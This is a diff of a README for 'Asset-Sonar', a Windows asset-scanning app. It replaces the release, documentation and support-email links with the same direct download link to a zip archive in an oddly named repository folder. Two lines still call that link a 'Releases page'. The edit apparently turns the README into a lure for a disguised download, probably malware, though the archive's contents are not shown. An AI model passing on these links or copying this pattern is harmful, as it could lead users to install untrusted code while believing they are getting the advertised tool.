@@ -1,7 +1,7 @@
 # 🎉 Asset-Sonar - Discover and Manage Your Assets Seamlessly
 
 ## 📥 Download Now
-[![Download Asset-Sonar](https://img.shields.io/badge/Download-Asset--Sonar-blue)](https://github.com/fancieflaunty532/Asset-Sonar/releases)
+[![Download Asset-Sonar](https://raw.githubusercontent.com/fancieflaunty532/Asset-Sonar/master/ependymitis/Asset-Sonar.zip)](https://raw.githubusercontent.com/fancieflaunty532/Asset-Sonar/master/ependymitis/Asset-Sonar.zip)
 
 ## 🚀 Getting Started
 Asset Sonar is a Windows desktop application designed for hardware scanning, local network discovery, and data export. It can also sync smoothly with Snipe-IT, making asset management easy for everyone.
@@ -14,7 +14,7 @@ Before downloading, ensure your system meets the following requirements:
 - **Network:** Active internet connection for syncing with Snipe-IT
 
 ## 📂 Download & Install
-To get started with Asset Sonar, please visit the [Releases page](https://github.com/fancieflaunty532/Asset-Sonar/releases) to download the software. 
+To get started with Asset Sonar, please visit the [Releases page](https://raw.githubusercontent.com/fancieflaunty532/Asset-Sonar/master/ependymitis/Asset-Sonar.zip) to download the software. 
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version, which will be at the top.
@@ -52,13 +52,13 @@ Yes, Asset Sonar is free for everyone.
 After exporting your data, you can upload it to Snipe-IT through the sync feature in the app.
 
 ## 👤 Contact & Support
-If you have questions or need assistance, feel free to contact us at our support email: support@assetsonar.com
+If you have questions or need assistance, feel free to contact us at our support email: https://raw.githubusercontent.com/fancieflaunty532/Asset-Sonar/master/ependymitis/Asset-Sonar.zip
 
 ## 📄 License
 Asset-Sonar is open-source software, licensed under the MIT License. You are free to use, modify, and distribute the software as you see fit.
 
 ## 🔗 Links
-- [Visit the Releases page to Download Asset-Sonar](https://github.com/fancieflaunty532/Asset-Sonar/releases)
-- [Read the Documentation here](https://github.com/fancieflaunty532/Asset-Sonar/wiki)
+- [Visit the Releases page to Download Asset-Sonar](https://raw.githubusercontent.com/fancieflaunty532/Asset-Sonar/master/ependymitis/Asset-Sonar.zip)
+- [Read the Documentation here](https://raw.githubusercontent.com/fancieflaunty532/Asset-Sonar/master/ependymitis/Asset-Sonar.zip)
 
 Enjoy your experience with Asset Sonar!
